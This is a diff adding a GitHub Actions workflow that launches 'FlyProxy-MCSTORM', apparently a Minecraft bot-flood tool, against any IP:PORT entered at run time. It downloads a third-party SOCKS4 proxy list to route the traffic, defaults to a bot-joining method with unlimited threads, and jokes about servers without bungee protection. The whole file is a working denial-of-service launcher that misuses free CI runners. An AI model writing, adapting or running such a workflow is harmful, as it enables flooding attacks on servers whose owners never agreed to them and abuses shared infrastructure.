@@ -1,0 +1,65 @@
+# basic MCSTORM on github
+
+name: FlyProxy-MCSTORM
+
+# Controls when the workflow will run
+on:
+  # Triggers the workflow on push or pull request events but only for the "main" branch
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+
+# Allows you to run this workflow manually from the Actions tab
+  workflow_dispatch:
+    inputs:
+      server_ip_value:
+        description: 'IP:PORT of server FlyProxy-MCSTORM.'
+        required: true
+        default: 'IP:PORT'
+        type: string
+      mcbot_method_value:
+        description: 'METHOD of FlyProxy-MCSTORM.'
+        required: true
+        default: 'botjoiner'
+        type: string
+      site_proxies_value:
+        description: 'From which site scrape proxies.'
+        required: true
+        default: 'https://raw.githubusercontent.com/TibuSpike001/4proxyssss/main/socks4.txt'
+        type: string
+      minecraft_protocol_value:
+        description: 'Set minecraft protocol for FlyProxy-MCSTORM.'
+        required: true
+        default: '340'
+        type: string
+      seconds:
+        description: 'Seconds for FlyProxy-MCSTORM.'
+        required: true
+        default: '240'
+        type: string
+      threads:
+        description: 'threads for FlyProxy-MCSTORM.'
+        required: true
+        default: '-1'
+        type: string
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run FlyProxy-MCSTORM with github actions. ggs if server doesnt have bungee lol:)
+        run: |
+          rm -rf proxies.txt
+          wget ${{ github.event.inputs.site_proxies_value}}
+          mv socks4.txt proxies.txt
+          java -jar FlyProxy-V1.jar ${{ github.event.inputs.server_ip_value }} ${{ github.event.inputs.minecraft_protocol_value}} ${{ github.event.inputs.mcbot_method_value }} ${{ github.event.inputs.seconds}} ${{ github.event.inputs.threads}}
+    env:
+      SERVER_IP_TEST: ${{ github.event.inputs.server_ip_value }}
+      MCBOT_METHOD_VALUE: ${{ github.event.inputs.mcbot_method_value }}
+      SITE_PROXIES: ${{ github.event.inputs.site_proxies_value}}
+      minecraft_protocol_value: ${{ github.event.inputs.minecraft_protocol_value}}
+      seconds: ${{ github.event.inputs.seconds}}
+      threads: ${{ github.event.inputs.threads}}
